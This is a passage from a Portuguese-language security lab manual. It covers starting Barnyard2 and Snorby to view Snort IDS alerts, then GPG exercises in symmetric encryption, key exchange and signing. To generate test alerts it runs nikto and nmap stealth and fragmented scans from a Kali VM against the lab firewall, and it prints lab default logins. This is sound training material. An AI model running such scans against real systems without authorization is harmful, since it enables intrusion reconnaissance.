<p>Recarregue a lista de serviços do sistema com o comando:</p>
<div class="literalblock">
<div class="content">
<pre># systemctl daemon-reload</pre>
</div>
</div>
</li>
<li>
<p>Agora, inicie o serviço do Barnyard2, como se segue:</p>
<div class="literalblock">
<div class="content">
<pre># systemctl start barnyard2.service</pre>
</div>
</div>
<div class="paragraph">
<p>Em seguida, monitore seu início com o comando:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># journalctl -u barnyard2.service -f
-- Logs begin at Mon 2018-10-15 15:59:29 -03.
out 15 16:22:58 FWGW1-A systemd[1]: Started Barnyard2 Snort log spooler.
out 15 16:22:58 FWGW1-A barnyard2[3739]: Running in Continuous mode
(...)</pre>
</div>
</div>
<div class="paragraph">
<p>O Barnyard pode demorar um certo tempo para iniciar, até cerca de três minutos. Observe os logs até que uma mensagem parecida com a que se segue apareça na tela:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>out 15 16:25:53 FWGW1-A barnyard2[3739]: Opened spool file '/var/log/snort/snort.log.1539630818'
out 15 16:25:53 FWGW1-A barnyard2[3739]: Waiting for new data</pre>
</div>
</div>
<div class="paragraph">
<p>Feito isso, encerre o monitoramento dos registros com <code>CTRL + C</code>&#8201;&#8212;&#8201;o Barnyard2 iniciou corretamente.</p>
</div>
</li>
<li>
<p>Inicie o Snorby como mostrado abaixo:</p>
<div class="literalblock">
<div class="content">
<pre># systemctl start snorby.service</pre>
</div>
</div>
</li>
<li>
<p>Usando o navegador web em sua máquina física, acesse a URL <code><a href="http://FWGW1-G:3000" class="bare">http://FWGW1-G:3000</a></code>, substituindo a palavra <code>FWGW1-G</code> pelo endereço IP externo do seu firewall (atrelado à interface <code>enp0s3</code>). Você verá a tela de login do Snorby; acesse com o usuário <code>snorby@example.com</code>, e senha <code>snorby</code>.</p>
<div class="paragraph">
<p>Você verá o <em>dashboard</em> principal do Snorby, como mostrado na imagem a seguir:</p>
</div>
<div id="img-snorby1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/snorby1.png" alt="snorby1">
</div>
<div class="title">Figure 65. Dashboard do Snorby</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_7_gerando_alertas_para_o_ids">7) Gerando alertas para o IDS</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Vamos gerar alguns alertas para testar o funcionamento da solução. No Virtualbox, conecte a placa de rede da máquina <em>KaliLinux-G</em> à rede externa, acessando <em>Settings</em> &gt; <em>Network 1</em> &gt; <em>Adapter 1</em> &gt; <em>Attached to: Bridged Adapter</em>. Em seguida, altere a configuração da interface para DHCP editando o arquivo <code>/etc/network/interfaces</code>:</p>
<div class="literalblock">
<div class="content">
<pre># hostname
KaliLinux-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /etc/network/interfaces
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cat /etc/network/interfaces | grep '^iface eth0'
iface eth0 inet dhcp</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl restart networking</pre>
</div>
</div>
<div class="paragraph">
<p>Ao final do processo, sua máquina <em>KaliLinux-G</em> deverá ter um endereço IP da rede externa, como:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># ip a s eth0 | grep '^ *inet ' | awk '{print $2}'
192.168.29.105/24</pre>
</div>
</div>
</li>
<li>
<p>Execute alguns comandos para gerar tráfego suspeito na direção da máquina <em>FWGW1-G</em>. Nos exemplos abaixo, o IP público <code>192.168.29.103</code> está sendo usado como o endereço da interface <code>enp0s3</code> da máquina <em>FWGW1-G</em>.</p>
<div class="paragraph">
<p>Primeiro, verifique que a máquina <em>LinServer-G</em> está ligada e em seguida rode o <code>nikto</code>, um <em>scanner</em> de servidores web:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nikto -h 192.168.29.103</pre>
</div>
</div>
<div class="paragraph">
<p>Use o <code>nmap</code> para realizar um <em>scan</em> do tipo <em>Xmas tree</em> na máquina <em>FWGW1-G</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nmap -sX 192.168.29.103 -p1-65535</pre>
</div>
</div>
<div class="paragraph">
<p>Use o <code>nmap</code> com a opção de fragmentar pacotes para realizar um <em>scan</em> na máquina <em>FWGW1-G</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nmap -Pn -sS -A -f 192.168.29.103</pre>
</div>
</div>
<div class="paragraph">
<p>Existem vários outros testes que podem ser realizados para gerar tráfego suspeito e testar a eficácia do IDS. A página <a href="https://www.aldeid.com/wiki/Suricata-vs-snort" class="bare">https://www.aldeid.com/wiki/Suricata-vs-snort</a> contém uma excelente lista de ataques e ferramentas sugeridos para realizar uma inspeção nesse sentido.</p>
</div>
</li>
<li>
<p>Vamos ver o que foi observado pelo Snort, através do Snorby. Acessando a aba <em>Events</em>, podemos observar que vários eventos foram gerados ao rodar a ferramenta <code>nikto</code>, como mostrado na imagem a seguir:</p>
<div id="img-snorby2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/snorby2.png" alt="snorby2">
</div>
<div class="title">Figure 66. Listagem de eventos no Snorby</div>
</div>
</li>
<li>
<p>É possível clicar em um evento para explorar mais detalhes sobre o mesmo, incluindo hosts de origem/destino do ataque, assinatura que causou o <em>match</em> no pacote, e até mesmo detalhes de seu <em>header</em> e <em>payload</em>. A imagem a seguir ilustra a inspeção de um evento de baixa criticidade, identificado como uma inspeção HTTP usando método desconhecido:</p>
<div id="img-snorby3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/snorby3.png" alt="snorby3">
</div>
<div class="title">Figure 67. Listagem de eventos no Snorby</div>
</div>
</li>
<li>
<p>Retorne a máquina <em>KaliLinux-G</em> para a rede <code>DMZ</code>, restaurando suas configurações de rede originais.</p>
</li>
</ol>
</div>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Nesta sessão fizemos a instalação de todas as ferramentas (Snort, PulledPork, Barnyard2 e Snorby) dentro da mesma máquina, <em>FWGW1-G</em>. É muito comum, no entanto, não sobrecarregar a máquina responsável pela tarefa de IDS/IPS também com a tarefa de operação do banco de dados e do <em>frontend</em> web, delegando essas tarefas a uma outra máquina.</p>
</div>
<div class="paragraph">
<p>Nesse cenário, instalaríamos o Snort, PulledPork e Barnyard2 na máquina <em>FWGW1-G</em>, e o Barnyard2, Snorby e a base de dados MariaDB em outra máquina (dedicada e segmentada para este fim). A máquina <em>FWGW1-G</em> se conectaria à base de dados remota para escrever os registros de eventos, sem ser necessário instalar nela uma série de dependências potencialmente perigosas, como o Ruby, compiladores e bibliotecas de desenvolvimento.</p>
</div>
<div class="paragraph">
<p>A configuração desse cenário mais complexo fica a cargo do leitor, como um exercício avançado.</p>
</div>
</td>
</tr>
</table>
</div>
</div>
<div class="sect2">
<h3 id="_referências">Referências</h3>
<div class="paragraph">
<p>[1] Novak, J. e Sturges, S. (2007). Target-Based TCP Stream Reassembly. [online] Pld.cs.luc.edu. Disponível em: <a href="http://pld.cs.luc.edu/courses/447/sum08/class5/novak,sturges.stream5_reassembly.pdf" class="bare">http://pld.cs.luc.edu/courses/447/sum08/class5/novak,sturges.stream5_reassembly.pdf</a> [Acessado em 4 Set. 2018].</p>
</div>
<div style="page-break-after: always;"></div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_sessão_6_autenticação_autorização_e_certificação_digital">Sessão 6: Autenticação, autorização e certificação digital</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_1_uso_de_criptografia_simétrica_em_arquivos">1) Uso de criptografia simétrica em arquivos</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em> e <em>LinServer-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Na máquina <em>FWGW1-G</em>, descubra quais cifras simétricas são suportadas pelo programa <code>gpg</code> (<em>GNU Privacy Guard</em>).</p>
<div class="literalblock">
<div class="content">
<pre>$ hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg --version | grep Cipher -A1
Cipher: IDEA, 3DES, CAST5, BLOWFISH, AES, AES192, AES256, TWOFISH,
        CAMELLIA128, CAMELLIA192, CAMELLIA256</pre>
</div>
</div>
</li>
<li>
<p>Crie um arquivo <code>teste.txt</code> com qualquer conteúdo. Criptografe-o usando a cifra simétrica AES256, com senha <code>rnpesr</code>. Em seguida, copie o arquivo cifrado resultante para o diretório <em>home</em> do usuário <code>aluno</code>, na máquina <em>LinServer-G</em>, usando o comando <code>scp</code>.</p>
<div class="literalblock">
<div class="content">
<pre>$ echo 'teste de cifragem' &gt; teste.txt</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg --symmetric --cipher-algo AES256 teste.txt</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ ls teste.txt*
teste.txt  teste.txt.gpg</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ scp teste.txt.gpg aluno@172.16.1.10:~
teste.txt.gpg                                                           100%   94     0.1KB/s   00:00</pre>
</div>
</div>
</li>
<li>
<p>Na máquina <em>LinServer-G</em>, tente descriptografar o arquivo copiado. Seu conteúdo permanece o mesmo?</p>
<div class="literalblock">
<div class="content">
<pre>$ hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ ls teste.txt*
teste.txt.gpg</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg -o teste.txt.out -d teste.txt.gpg
gpg: AES256 encrypted data
gpg: encrypted with 1 passphrase</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ cat teste.txt.out
teste de cifragem</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_2_uso_de_criptografia_assimétrica_em_arquivos">2) Uso de criptografia assimétrica em arquivos</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em> e <em>LinServer-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Na máquina <em>FWGW1-G</em>, como usuário <code>root</code>, instale o pacote <code>rng-tools</code> e rode o comando <code>rngd -r /dev/urandom</code>:</p>
<div class="literalblock">
<div class="content">
<pre># hostname ; whoami
FWGW1-A
root</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get install rng-tools</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># rngd -r /dev/urandom</pre>
</div>
</div>
</li>
<li>
<p>Agora, como usuário <code>aluno</code>, descubra quais cifras assimétricas são suportadas pelo programa <code>gpg</code> (<em>GNU Privacy Guard</em>).</p>
<div class="literalblock">
<div class="content">
<pre>$ hostname ; whoami ; pwd
FWGW1-A
aluno
/home/aluno</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg --version | grep Pubkey
Pubkey: RSA, ELG, DSA, ECDH, ECDSA, EDDSA</pre>
</div>
</div>
</li>
<li>
<p>Vamos fazer um exercício de criptografia usando chaves assimétricas entre dois usuários fictícios, Alice (operando na máquina <em>FWGW1-G</em>) e Bobby (operando na máquina <em>LinServer-G</em>). Vamos começar por Alice&#8201;&#8212;&#8201;gere um par de chaves assimétricas RSA padrão, com 4096 bits e sem data de expiração para ela, usando o programa <code>gpg</code> com a opção <code>--full-generate-key</code>. O e-mail de Alice será <a href="mailto:alice@seg12.esr.rnp.br">alice@seg12.esr.rnp.br</a> , e a senha de acesso à chave será <code>rnpesr123</code>.</p>
<div class="literalblock">
<div class="content">
<pre>$ gpg --full-generate-key</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>gpg (GnuPG) 2.1.18; Copyright (C) 2017 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Please select what kind of key you want:
   (1) RSA and RSA (default)
   (2) DSA and Elgamal
   (3) DSA (sign only)
   (4) RSA (sign only)
Your selection? 1
RSA keys may be between 1024 and 4096 bits long.
What keysize do you want? (2048) 4096
Requested keysize is 4096 bits
Please specify how long the key should be valid.
         0 = key does not expire
      &lt;n&gt;  = key expires in n days
      &lt;n&gt;w = key expires in n weeks
      &lt;n&gt;m = key expires in n months
      &lt;n&gt;y = key expires in n years
Key is valid for? (0) 0
Key does not expire at all
Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name: Alice
Email address: alice@seg12.esr.rnp.br
Comment:
You selected this USER-ID:
    "Alice &lt;alice@seg12.esr.rnp.br&gt;"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? O

(...)

gpg: key EB757978FB898C57 marked as ultimately trusted
gpg: revocation certificate stored as '/home/aluno/.gnupg/openpgp-revocs.d/5A62CAF74E46B70509335DA7EB757978FB898C57.rev'
public and secret key created and signed.

pub   rsa4096 2018-10-16 [SC]
      5A62CAF74E46B70509335DA7EB757978FB898C57
      5A62CAF74E46B70509335DA7EB757978FB898C57
uid                      Alice &lt;alice@seg12.esr.rnp.br&gt;
sub   rsa4096 2018-10-16 [E]</pre>
</div>
</div>
</li>
<li>
<p>Na máquina <em>LinServer-G</em>, como usuário <code>root</code>, instale o pacote <code>rng-tools</code> e rode o comando <code>rngd -r /dev/urandom</code>:</p>
<div class="literalblock">
<div class="content">
<pre># hostname ; whoami
LinServer-A
root</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get install rng-tools</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># rngd -r /dev/urandom</pre>
</div>
</div>
</li>
<li>
<p>Como usuário <code>aluno</code>, gere a chave de Bobby na máquina <em>LinServer-G</em>. Repita o procedimento do passo (2), alterando o nome de usuário para Bobby e o email para <a href="mailto:bobby@seg12.esr.rnp.br">bobby@seg12.esr.rnp.br</a> .</p>
<div class="literalblock">
<div class="content">
<pre>$ hostname ; whoami ; pwd
LinServer-A
aluno
/home/aluno</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg --full-generate-key
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>gpg: key 6F4EC30E8E0D7290 marked as ultimately trusted
gpg: revocation certificate stored as '/home/aluno/.gnupg/openpgp-revocs.d/89AD21B9914F4E7E91AA89D06F4EC30E8E0D7290.rev'
public and secret key created and signed.

pub   rsa4096 2018-10-16 [SC]
      89AD21B9914F4E7E91AA89D06F4EC30E8E0D7290
      89AD21B9914F4E7E91AA89D06F4EC30E8E0D7290
uid                      Bobby &lt;bobby@seg12.esr.rnp.br&gt;
sub   rsa4096 2018-10-16 [E]</pre>
</div>
</div>
</li>
<li>
<p>Temos que exportar as chaves públicas de ambos os usuários, copiá-las para a máquina remota, e importá-las. Comece pela chave de Alice, exportando-a em formato <em>ASCII armored</em>; em seguida, copie-a para a máquina <em>LinServer-G</em> usando o <code>scp</code>, importe-a usando <code>gpg --import</code> e assine a chave.</p>
<div class="paragraph">
<p>Na máquina <em>FWGW1-G</em>, execute:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg --armor --export Alice &gt; alice_public.asc</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ scp alice_public.asc aluno@172.16.1.10:~
alice_public.asc                                                        100% 3083     3.0KB/s   00:00</pre>
</div>
</div>
<div class="paragraph">
<p>Agora, na máquina <em>LinServer-G</em>, execute:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg --import alice_public.asc
gpg: key EB757978FB898C57: public key "Alice &lt;alice@seg12.esr.rnp.br&gt;" imported
gpg: Total number processed: 1
gpg:               imported: 1</pre>
</div>
</div>
<div class="paragraph">
<p><strong>Valide</strong> a chave recebida com o remetente (por exemplo, verficando que o <em>fingerprint</em> está de fato correto), e posteriormente assine-a como mostrado a seguir.</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg --edit-key Alice
gpg (GnuPG) 2.1.18; Copyright (C) 2017 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.


gpg: checking the trustdb
gpg: marginals needed: 3  completes needed: 1  trust model: pgp
gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
pub  rsa4096/EB757978FB898C57
     created: 2018-10-16  expires: never       usage: SC
     trust: unknown       validity: unknown
sub  rsa4096/CDDA806670DAA306
     created: 2018-10-16  expires: never       usage: E
[ unknown] (1). Alice &lt;alice@seg12.esr.rnp.br&gt;</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>gpg&gt; fpr
pub   rsa4096/EB757978FB898C57 2018-10-16 Alice &lt;alice@seg12.esr.rnp.br&gt;
 Primary key fingerprint: 5A62 CAF7 4E46 B705 0933  5DA7 EB75 7978 FB89 8C57</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>gpg&gt; sign

pub  rsa4096/EB757978FB898C57
     created: 2018-10-16  expires: never       usage: SC
     trust: unknown       validity: unknown
 Primary key fingerprint: 5A62 CAF7 4E46 B705 0933  5DA7 EB75 7978 FB89 8C57

     Alice &lt;alice@seg12.esr.rnp.br&gt;

Are you sure that you want to sign this key with your
key "Bobby &lt;bobby@seg12.esr.rnp.br&gt;" (6F4EC30E8E0D7290)

Really sign? (y/N) y</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>gpg&gt; quit
Save changes? (y/N) y</pre>
</div>
</div>
</li>
<li>
<p>Faça o procedimento reverso, exportando/copiando/importando e assinando a chave de Bobby na máquina de Alice. Lembre-se que o <code>ssh</code> para a máquina <em>FWGW1-G</em> é permitido apenas a partir da Intranet, então pode ser mais interessante iniciar o procedimento de cópia a partir do firewall, e não da máquina <em>LinServer-G</em>.</p>
<div class="paragraph">
<p>Primeiro, na máquina <em>LinServer-G</em>, vamos exportar a chave:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg --armor --export Bobby &gt; bobby_public.asc</pre>
</div>
</div>
<div class="paragraph">
<p>Como não há regra que permita <code>ssh</code> da DMZ para a máquina <em>FWGW1-G</em>, vamos fazer a cópia no sentido inverso:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ scp aluno@172.16.1.10:~/bobby_public.asc ~
bobby_public.asc                                                        100% 3083     3.0KB/s   00:00</pre>
</div>
</div>
<div class="paragraph">
<p>Agora, basta importar e assinar a chave:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg --import bobby_public.asc
gpg: key 6F4EC30E8E0D7290: public key "Bobby &lt;bobby@seg12.esr.rnp.br&gt;" imported
gpg: Total number processed: 1
gpg:               imported: 1</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg --edit-key Bobby
gpg (GnuPG) 2.1.18; Copyright (C) 2017 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.


pub  rsa4096/6F4EC30E8E0D7290
     created: 2018-10-16  expires: never       usage: SC
     trust: unknown       validity: unknown
sub  rsa4096/DC5CA71609A03084
     created: 2018-10-16  expires: never       usage: E
[ unknown] (1). Bobby &lt;bobby@seg12.esr.rnp.br&gt;</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>gpg&gt; fpr
pub   rsa4096/6F4EC30E8E0D7290 2018-10-16 Bobby &lt;bobby@seg12.esr.rnp.br&gt;
 Primary key fingerprint: 89AD 21B9 914F 4E7E 91AA  89D0 6F4E C30E 8E0D 7290</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>gpg&gt; sign

pub  rsa4096/6F4EC30E8E0D7290
     created: 2018-10-16  expires: never       usage: SC
     trust: unknown       validity: unknown
 Primary key fingerprint: 89AD 21B9 914F 4E7E 91AA  89D0 6F4E C30E 8E0D 7290

     Bobby &lt;bobby@seg12.esr.rnp.br&gt;

Are you sure that you want to sign this key with your
key "Alice &lt;alice@seg12.esr.rnp.br&gt;" (EB757978FB898C57)

Really sign? (y/N) y</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>gpg&gt; quit
Save changes? (y/N) y</pre>
</div>
</div>
</li>
<li>
<p>Agora, vamos fazer o teste de criptografia assimétrica propriamente dito. Na máquina <em>FWGW1-G</em>, verifique que as chaves estão de fato disponíveis. Em seguida, criptografe um documento de texto com conteúdo qualquer com a chave pública de Bobby, envie para a máquina <em>LinServer-G</em>, e tente decriptá-lo usando a chave privada de Bobby.</p>
<div class="paragraph">
<p>Na máquina <em>FWGW1-G</em>, vamos verificar se as chaves estão disponíveis:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg --list-keys
gpg: checking the trustdb
gpg: marginals needed: 3  completes needed: 1  trust model: pgp
gpg: depth: 0  valid:   1  signed:   1  trust: 0-, 0q, 0n, 0m, 0f, 1u
gpg: depth: 1  valid:   1  signed:   0  trust: 1-, 0q, 0n, 0m, 0f, 0u
/home/aluno/.gnupg/pubring.kbx
------------------------------
pub   rsa4096 2018-10-16 [SC]
      5A62CAF74E46B70509335DA7EB757978FB898C57
uid           [ultimate] Alice &lt;alice@seg12.esr.rnp.br&gt;
sub   rsa4096 2018-10-16 [E]

pub   rsa4096 2018-10-16 [SC]
      89AD21B9914F4E7E91AA89D06F4EC30E8E0D7290
uid           [  full  ] Bobby &lt;bobby@seg12.esr.rnp.br&gt;
sub   rsa4096 2018-10-16 [E]</pre>
</div>
</div>
<div class="paragraph">
<p>Perfeito. Vamos criar um documento <code>asym.txt</code> com conteúdo qualquer e criptografá-lo com a chave pública de Bobby, e finalmente copiá-lo para a máquina <em>LinServer-G</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ echo 'teste assimetrico' &gt; asym.txt</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg -e -r Bobby asym.txt</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ ls asym.txt*
asym.txt  asym.txt.gpg</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ scp asym.txt.gpg aluno@172.16.1.10:~
asym.txt.gpg                                                            100%  614     0.6KB/s   00:00</pre>
</div>
</div>
<div class="paragraph">
<p>Na máquina <em>LinServer-G</em>, vamos tentar decriptar o arquivo com a chave privada de Bobby:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ ls asym.txt*
asym.txt.gpg</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg -o asym.txt -d asym.txt.gpg
gpg: encrypted with 4096-bit RSA key, ID DC5CA71609A03084, created 2018-10-16
      "Bobby &lt;bobby@seg12.esr.rnp.br&gt;"</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ cat asym.txt
teste assimetrico</pre>
</div>
</div>
</li>
<li>
<p>Vamos agora testar a assinatura digital de arquivos. Começando a partir da máquina <em>LinServer-G</em>, crie um arquivo texto com conteúdo qualquer. Assine-o com a chave privada de Bobby, e copie o arquivo para a máquina <em>FWGW1-G</em>. Finalmente, verifique a assinatura usando o <em>keyring</em> de Alice.</p>
<div class="paragraph">
<p>Na máquina <em>LinServer-G</em>, vamos criar um arquivo com conteúdo qualquer e assiná-lo usando a chave privada de Bobby, em texto claro (opção <code>--clearsign</code>):</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ echo 'teste assinatura' &gt; sign.txt</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg --clearsign sign.txt</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ ls sign.txt*
sign.txt      sign.txt.asc</pre>
</div>
</div>
<div class="paragraph">
<p>Note que tanto o conteúdo do arquivo quanto a assinatura estão em texto claro, uma vez que a mensagem foi apenas assinada (e não criptografada).</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ cat sign.txt.asc
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

teste assinatura
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEia0huZFPTn6RqonQb07DDo4NcpAFAlvFs3oACgkQb07DDo4N
cpB5CA/+JCdrJlc30UbFFuXhaIlK5uu73cc7Cy9pVAz0nZ9QNvQyAxF7EHOlsXM+
NbohVHQRW3PU5nSKUzcybX/u3to0TJ8T2My4YyzS3xHktDdmoQZCSUqANG0aVpsd
nuByu7Q0NX+yKETJlsVHskhBs/iQ7TXqxl80FmutfNHeh42EMD3wOajAsWS0YZbh
YBwp1WGnyPmoEDeC+ijtsaNj2oXTQSQ0c208jeibQZC7v375ZwtU5dcfc+9WuA8G
uG0eabHeINedQw0OWLDAvHCyC+uKI4Nny6vQYtS4PfDDWtxxl1UYQKyypcCIcwiN
m5qKcMZED1/cxCWNKtopfbwaL5jPAGu1M+lGXwF1JQqI6o3gjP25w1kUkSXpB83F
ljwYMzzZjSzk0XP1XRl/t4jTEdbDFIw4hzDMzlAu7ZljdMZ0+pkp73rPiZjvzexd
z57jGZyYsR2y/VqctICEw8bQOv5OMvwUyCBQ6ucTtkPcsWKlIHZEKXXEKla3V3yD
476t1ZkHQCquGI2MrOS1JMp3EFlHdkJeJoXrVmlsj5TmvPkvTjZPCPSXkMvgxkJQ
grzQZcg3BSXpuHRkOvOYQIZXCpoJfMjREjqcqQW0cLEtVutjEYLcVEWglOLm49zS
P26ADVE+YLgacS4EMIflK6qOELye/PKQrV3LZKEeKaOdrdJT4us=
=zFNN
-----END PGP SIGNATURE-----</pre>
</div>
</div>
<div class="paragraph">
<p>Vamos copiar o arquivo para a máquina <em>FWGW1-G</em> (lembrando que a cópia deve ser iniciada no sentido inverso, devido às regras de firewall), e verificar a assinatura.</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ scp aluno@172.16.1.10:~/sign.txt.asc ~
sign.txt.asc                                                            100%  883     0.9KB/s   00:00</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg --verify sign.txt.asc
gpg: Signature made ter 16 out 2018 06:46:34 -03
gpg:                using RSA key 89AD21B9914F4E7E91AA89D06F4EC30E8E0D7290
gpg: Good signature from "Bobby &lt;bobby@seg12.esr.rnp.br&gt;" [full]</pre>
</div>
</div>
</li>
<li>
<p>Finalmente, vamos "juntar tudo". Da máquina <em>FWGW1-G</em>, crie um arquivo texto com conteúdo qualquer e (1) assine-o com a <strong>chave privada de Alice</strong>, e (2) criptografe-o com a <strong>chave pública de Bobby</strong>. Copie o arquivo para a máquina <em>LinServer-G</em>, decripte-o e verifique sua assinatura.</p>
<div class="paragraph">
<p>Na máquina <em>FWGW1-G</em>, vamos criar um arquivo com conteúdo qualquer, assiná-lo, criptografá-lo e enviar para a máquina <em>LinServer-G</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ echo 'teste assinatura e criptografia assimetrica' &gt; sign-asym.txt</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg -s -e -r Bobby sign-asym.txt</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ ls sign-asym.txt*
sign-asym.txt  sign-asym.txt.gpg</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ scp sign-asym.txt.gpg aluno@172.16.1.10:~
sign-asym.txt.gpg                                                       100% 1207     1.2KB/s   00:00</pre>
</div>
</div>
<div class="paragraph">
<p>Agora, na máquina <em>LinServer-G</em>, basta invocar a opção <code>-d</code> do <code>gpg</code>. Além de decriptar o arquivo, sua assinatura será verificada.</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ gpg -o sign-asym.txt -d sign-asym.txt.gpg
gpg: encrypted with 4096-bit RSA key, ID DC5CA71609A03084, created 2018-10-16
      "Bobby &lt;bobby@seg12.esr.rnp.br&gt;"
gpg: Signature made ter 16 out 2018 06:48:13 -03
gpg:                using RSA key 5A62CAF74E46B70509335DA7EB757978FB898C57
gpg: checking the trustdb
gpg: marginals needed: 3  completes needed: 1  trust model: pgp
gpg: depth: 0  valid:   1  signed:   1  trust: 0-, 0q, 0n, 0m, 0f, 1u
gpg: depth: 1  valid:   1  signed:   0  trust: 1-, 0q, 0n, 0m, 0f, 0u
gpg: Good signature from "Alice &lt;alice@seg12.esr.rnp.br&gt;" [full]</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ cat sign-asym.txt
teste assinatura e criptografia assimetrica</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_3_uso_de_criptografia_assimétrica_em_e_mails">3) Uso de criptografia assimétrica em e-mails</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
